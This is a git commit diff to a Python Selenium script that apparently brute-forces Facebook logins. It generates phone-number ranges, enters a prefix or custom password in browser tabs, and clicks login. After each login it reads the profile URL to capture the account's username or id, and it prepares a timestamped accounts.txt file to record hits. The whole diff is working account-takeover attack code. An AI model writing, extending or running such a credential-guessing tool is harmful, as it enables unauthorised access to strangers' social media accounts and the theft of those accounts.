57cc0c357b407a44825cfb3e1474ed3fad6d4f64
jimam <jimamtamimi12@gmail.com>
2022-08-14 22:03:17 +0600

    bug fixes

--- main.py
+++ main.py
@@ -1,16 +1,20 @@
+from datetime import datetime
+import os
 from random import randint
 from threading import Thread
 from time import sleep
-from selenium import webdriver
+from selenium import webdriver 
 from selenium.webdriver.common.by import By
+from urllib import parse
+from selenium.webdriver.support import expected_conditions as EC
+from selenium.webdriver.support.ui import WebDriverWait
 
-
-
+DELAY = 5
 
 
 
 def run(firstNum, secondNum, totalTabs, totalAccount, prefix, newPass, customPass, passwordIndex):
-    print(prefix)
+    currentTime = str(datetime.strftime(datetime.now(), "%Y-%m-%d__%H-%M-%S"))
     numberTried = []
     mainList = []
     tmpList = []
@@ -39,7 +43,25 @@ def run(firstNum, secondNum, totalTabs, totalAccount, prefix, newPass, customPas
         passInput.send_keys(password)
         loginBtn = driver.find_element(By.NAME, 'login')
         loginBtn.click()
+        sleep(2)
+        if not WebDriverWait(driver, DELAY/2).until(EC.presence_of_element_located((By.XPATH, "/html/body/div[1]/div/div[1]/div/form"))):
+            return
+        driver.get("https://www.facebook.com/profile.php?")
+        sleep(1)
+        cUrl = driver.current_url
+        urlData = dict(parse.parse_qsl(parse.urlsplit(cUrl).query))
+        username = ""
+        if(urlData == {}):
+            username = cUrl.replace("https://www.facebook.com/", "")
+            cUrl.replace("/", "")
+        else:
+            username = urlData['id']
+        
+            
 
+    os.makedirs(currentTime)
+    with open(f"{currentTime}/accounts.txt", "w") as f:
+        pass
     for numbers in mainList:
         def tryAccount(numbers):
             driver = webdriver.Chrome(executable_path='./chromedriver.exe')
